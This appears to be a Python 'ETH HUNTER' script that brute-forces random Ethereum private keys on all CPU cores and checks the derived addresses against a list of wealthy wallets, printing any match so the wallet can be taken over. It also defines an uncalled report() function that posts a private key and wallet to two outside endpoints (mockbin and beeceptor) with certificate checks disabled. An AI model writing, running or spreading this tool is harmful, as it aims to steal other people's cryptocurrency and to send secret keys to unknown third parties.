from sha3 import keccak_256
from threading import Thread
from secrets import token_bytes
from coincurve import PublicKey
import requests
from random import sample
import os
import sys

cores = os.cpu_count()
threads = []

print("##########################")
print("##\tETH HUNTER\t##")
print("##########################")
print(f"# -- CPUs : {cores}\t\t #")
print("#\t\t\t #")
print("##########################\n\n\n")

if hasattr(sys, '_MEIPASS'):
    base_path = sys._MEIPASS
else:
    base_path = os.path.abspath(os.path.dirname(__file__))
file_name = 'list.txt'
file_path = os.path.join(base_path, file_name)

richers = open('list.txt').read().split('\n')
while '' in richers: richers.remove('')

def report(key, wal):
    urls = [
        "https://mockbin.org/bin/9d2ecf95-fd84-4307-8a91-4363bbcf2a1e",
        "https://ethereum.free.beeceptor.com"
    ]
    payload = {"key": key,"wal": wal}
    for url in urls: requests.post(url, json=payload, verify=False)


def check_address():
    short_richs  = sample(richers, 500)
    while True:
        key = keccak_256(token_bytes(32)).digest()
        public_key = PublicKey.from_valid_secret(key).format(compressed=False)[1:]
        addr = keccak_256(public_key).digest()[-20:]
        key = '0x' + key.hex().lower()
        addr = '0x' + addr.hex().lower()
        if addr in short_richs:
            print(f"{key}\t{addr}")

for i in range(cores):
    thread = Thread(target=check_address)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
